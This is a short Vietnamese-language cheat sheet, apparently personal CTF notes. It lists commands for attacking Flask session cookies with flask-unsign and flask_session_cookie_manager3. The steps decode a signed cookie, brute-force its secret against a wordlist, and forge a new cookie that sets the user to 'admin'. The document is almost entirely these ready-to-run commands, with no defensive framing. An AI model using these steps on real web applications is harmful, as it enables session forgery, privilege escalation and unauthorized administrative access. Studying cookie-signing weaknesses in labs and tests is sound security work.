# Flask Python

# flask-unsign

## Để decode cookie
```cmd
flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YN0XnA.7gxzLqrMvac6qFqngQVIbabvHAY' 
```

## Để dò secret
```cmd
flask-unsign --unsign --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YN0XnA.7gxzLqrMvac6qFqngQVIbabvHAY' --wordlist=worklist_cookie.txt
```

## Thay đổi cookie và bỏ secret vào
```cmd
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'peanut butter'
```

# Flask Session Cookie

## Để decode cookie với secret
```cmd
python3 flask_session_cookie_manager3.py decode -c 'eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw' -s '.{y]tR&sp&77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d'
```

## decode ko có secret 
```cmd
python3 flask_session_cookie_manager3.py decode -c 'eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw'
```


## Thay đổi cookie và bỏ secret vào
```cmd
python3 flask_session_cookie_manager3.py encode -s '.{y]tR&sp&77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d' -t '{"number":"326410031505","username":"admin"}'
```
